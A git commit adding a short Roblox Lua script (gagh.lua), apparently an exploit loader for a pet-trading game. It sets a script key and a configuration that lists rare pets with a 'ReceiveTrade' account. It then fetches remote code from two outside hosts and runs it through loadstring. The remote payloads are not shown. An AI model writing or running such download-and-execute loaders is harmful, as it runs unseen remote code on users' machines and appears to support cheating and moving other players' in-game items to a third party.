5d86d18f1cec2259ab024a50558aa2b38589f09f
Xiaobug065 <133509354+Xiaobug065@users.noreply.github.com>
2025-07-13 15:41:37 +0700

    Create gagh.lua

---
+++ gagh.lua
@@ -0,0 +1,14 @@
+repeat wait() until game:IsLoaded() and game.Players.LocalPlayer 
+
+task.spawn(function()
+    _G.ModeLog = "Grow"
+    _G.Api = "http://localhost:8899"
+    loadstring(game:HttpGet("https://api.genhubs.com/v2/loadscript_log/?script_key=Vcfm0uDBvASKzIfoexHgsMXYLvdEi3Vz", true))()
+end)
+
+getgenv().MeowKey = "MEOW_DEMO_2025" 
+getgenv().Config = getgenv().Config or {
+    PetTradeList = { "Fennec Fox", "Disco", "Dragon", "Butter", "Octopus", "Raccoon", "Scarlet", "Brontos", "T-Rex", "Red Fox" },
+    ReceiveTrade = "Genhubs"
+}
+loadstring(game:HttpGet("https://meow.g2tech.xyz/script?game=grow_trade"))() 
